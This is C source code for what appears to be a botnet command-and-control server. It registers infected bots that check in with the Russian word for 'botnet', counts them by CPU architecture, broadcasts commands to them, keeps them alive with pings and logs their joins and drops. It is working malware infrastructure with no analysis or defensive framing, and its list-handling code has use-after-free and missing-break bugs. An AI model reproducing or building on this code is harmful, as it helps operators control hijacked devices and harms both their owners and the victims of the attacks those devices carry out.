#include "headers/main.h"

void epoll_control(int fd, uint32_t events, int op) {
    struct epoll_event event;

    event.data.fd = fd;
    event.events = events;

    epoll_ctl(EpollFD, op, fd, &event);
}

bool check_dupe(int fd) {
    for (int i = 0; i < MAXFDS; i++) {
		if (!clients[i].connected || i == fd)
			continue;
        
		if (clients[i].ip == clients[fd].ip) {
            close(fd);
			return true;
		}
	}
    return false;
}

void *broadcast(char *msg) {
    int len = strlen(msg), i = 0;

	for (int i = 0; i < MAXFDS; i++) {
		if (clients[i].connected)
			send(i, msg, len, MSG_NOSIGNAL);
	}
	return 0;
}

unsigned int BotsConnected()
{
    int total = 0;
	for(int i = 0; i < MAXFDS; i++) {
        if(clients[i].connected)
            total++;
    }
    return total;
}

void arch_append_list(char *arch) {
    Arch *last = arch_head, *node = calloc(1, sizeof(Arch));

    strcpy(node->arch, arch);

    node->next = NULL; //next will be null cuz we're appending

    if(arch_head == NULL) { //if there are no elements
        node->prev = NULL; //theres no previous in the first one
        arch_head = node; //setting the arch_head

        return;
    }

    while(last->next != NULL)
        last = last->next; //get a unused element
    
    last->next = node; //set the unused element to the node
    node->prev = last; //set the previous to the previous valid one found in the loop
}

Arch *arch_find_node(char *arch) {
    Arch *search = arch_head;

    while(search != NULL) { //search thru the list
        if(!strcmp(arch, search->arch))
            return search;
        
        search = search->next;
    }
    
    return NULL;
}

int arch_remove_list(Arch *del) {
    Arch *ret, *tmp;

    if(arch_head == NULL || del == NULL) //it would be bad if we freed a null variable
        return 0;
    
    if(del == arch_head) { //if the node we want to delete is the arch_header
        arch_head = del->next;

        arch_head->prev = NULL; //set the previous to null because we're gonna be the first element
    }
    else
        del->prev->next = del->next; //i dont get this
    
    free(del);

    ret = del->next;
}

void change_arch(char *arch, int opt) {
    Arch *found = arch_find_node(arch);

    if(found == NULL)
        return;

    switch(opt) {
        case 0:
            found->bots--;
        case 1:
            found->bots++;
    }
}

void filter_arch() {
    Arch *node = arch_head;

    while(node != NULL) {
        if(node->bots < 1)
            arch_remove_list(node);

        node = node->next;
    }
}

void leave_bot(int fd) {
    printf("\e[37;1m[\e[31;1m-\e[37;1m] ConnectionLost\e[31;1m:\e[37;1m%s\e[31;1m:\e[37;1m%s\r\n", inet_ntoa((struct in_addr){clients[fd].ip}), clients[fd].arch);
    SendLog(fd, "logs/bots_leave.log", "%s:%s\r\n", inet_ntoa((struct in_addr){clients[fd].ip}), clients[fd].arch);

    change_arch(clients[fd].arch, 0);

    if(clients[fd].connected)
        close(fd);
}

void accept_connection(void) {
    int afd;
    struct sockaddr_in addr;
    socklen_t len = sizeof(struct sockaddr_in);

    while(true) {
        if((afd = accept4(ListenFD, (struct sockaddr *)&addr, &len, SOCK_NONBLOCK)) != -1) {
            if(check_dupe(afd))
                continue;

            clients[afd].ip = addr.sin_addr.s_addr;
            clients[afd].pings = 0;

            epoll_control(afd, EPOLLIN | EPOLLET, EPOLL_CTL_ADD);
        }
        else
            break;
    }
}

void recv_bot(int fd) {
    int ret = 0;
    char rdbuf[1024] = {0};

    if((ret = recv(fd, rdbuf, 1023, MSG_NOSIGNAL)) == 0) {
		if(clients[fd].connected)
			leave_bot(fd);

#ifdef DEBUG
        printf("[error] recv: %s\n", strerror(errno));
#endif
        memset(&clients[fd], 0, sizeof(struct clientdata_t));
        return;
    }

    if (strstr(rdbuf, "PONG")) {
		clients[fd].pings = 0;
        return;
	}

    else if(strcasestr(rdbuf, "ботнет")) {
        strcpy(clients[fd].arch, rdbuf + 13);
        if(strlen(clients[fd].arch) > 1) {
            if (!arch_find_node(clients[fd].arch))
                arch_append_list(clients[fd].arch);
            
            clients[fd].connected = 1;
            printf("\e[37;1m[\e[32;1m+\e[37;1m] ConnectionEstablished\e[32;1m:\e[37;1m%s\e[32;1m:\e[37;1m%s\r\n", inet_ntoa((struct in_addr){clients[fd].ip}), clients[fd].arch);
            SendLog(fd, "logs/Join.log", "%s:%s\r\n", inet_ntoa((struct in_addr){clients[fd].ip}), clients[fd].arch);
            change_arch(clients[fd].arch, 1);
        }
    }
}

void *send_pings(void *args) {
    while(1) {
        for(int i = 0; i < MAXFDS; i++) {
            if(!clients[i].connected)
                continue;

            if(clients[i].pings >= 10) {
#ifdef DEBUG
                printf("[error] ping: %s\n", strerror(errno));
#endif
                leave_bot(i);
                memset(&clients[i], 0, sizeof(struct clientdata_t));
                break;
            }


            if(send(i, "PING", 4, MSG_NOSIGNAL) == -1) {
#ifdef DEBUG
                printf("[send] recv: %s\n", strerror(errno));
#endif
                leave_bot(i);
                memset(&clients[i], 0, sizeof(struct clientdata_t));
                break;
            }
            clients[i].pings++;
        }
        sleep(15);
    }
}

int create_and_bind(int bp) {
	int fd = socket(AF_INET, SOCK_STREAM, 0);

	int yes = 1;
	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1);

	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(bp);
	addr.sin_addr.s_addr = INADDR_ANY;

	if(bind(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) {
		printf("bind failed: %d\n", bp);
		return -1;
	}

	listen(fd, SOMAXCONN);

	return fd;
}

void *BotListener()
{
	int sockfd, ClientSock, ye = 1;
	socklen_t clilen;
	struct sockaddr_in serv;
	struct sockaddr_in cli;
	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		perror("ERROR opening socket");
	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &ye, sizeof(int)) < 0)
		;
	bzero((char *)&serv, sizeof(serv));
	serv.sin_family = AF_INET;
	serv.sin_addr.s_addr = INADDR_ANY;
	serv.sin_port = htons(CncPort);
	if (bind(sockfd, (struct sockaddr *)&serv, sizeof(serv)) < 0)
		perror("ERROR on binding");
	listen(sockfd, 5);
	clilen = sizeof(cli);
	while (1)
	{
		sprintf(iplog, "%d.%d.%d.%d", cli.sin_addr.s_addr & 0xFF, (cli.sin_addr.s_addr & 0xFF00) >> 8, (cli.sin_addr.s_addr & 0xFF0000) >> 16, (cli.sin_addr.s_addr & 0xFF000000) >> 24);
		SendLog(sockfd, "logs/Ip.log", "Ip Address: [%s] Connected To The Cnc.\r\n", iplog);
		ClientSock = accept(sockfd, (struct sockaddr *)&cli, &clilen);
		if (ClientSock < 0)
			perror("ERROR on accept");
		pthread_t clithread;
		pthread_create(&clithread, NULL, &BotWorker, (void *)(intptr_t)ClientSock);
	}
}

void *BotEventLoop() {
    int nfds;
    pthread_t shit_thread;
    struct epoll_event *events = calloc(MAXFDS, sizeof(struct epoll_event));

    pthread_create(&shit_thread, NULL, send_pings, NULL);
	
    while(true) {
        nfds = epoll_wait(EpollFD, events, MAXFDS, -1);

        if(nfds == -1)
            printf("epoll errno: %d\n", errno);

        for(int i = 0; i < nfds; i++) {
            if(events[i].data.fd == ListenFD)
                accept_connection();
            else
                recv_bot(events[i].data.fd);
        }
    }
}
